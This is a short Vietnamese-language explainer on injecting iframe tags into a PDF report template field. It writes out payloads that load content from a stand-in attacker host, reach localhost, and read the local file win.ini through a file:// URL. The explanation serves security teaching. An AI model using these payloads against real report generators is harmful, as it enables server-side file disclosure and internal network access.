

### Ví dụ về việc chèn `<iframe>` vào template phần tử:

Giả sử ứng dụng cho phép người dùng gửi yêu cầu tạo báo cáo PDF, và người dùng có thể chèn các mẫu dữ liệu vào thông qua một hệ thống đầu vào không được kiểm tra. Kẻ tấn công có thể lợi dụng tính năng này để chèn mã độc, cụ thể là thẻ `<iframe>`, vào trong phần tử template.


#### Chèn mã độc vào `template`:

Kẻ tấn công có thể chèn vào một `iframe` độc hại trong giá trị của `element[:template]`, ví dụ:

```html
<iframe src="http://attacker.com/malicious_script"></iframe>
```

Khi mã này được xử lý mà không được kiểm tra vệ sinh đúng cách, nó sẽ được đưa vào báo cáo phân tích, và iframe sẽ được tải từ địa chỉ của kẻ tấn công.

Đọc file nội bộ:
```
<iframe src="http://localhost/some/directory"></iframe>
```
```
<iframe src="file:///C:/Windows/win.ini" width="500" height="500">
```
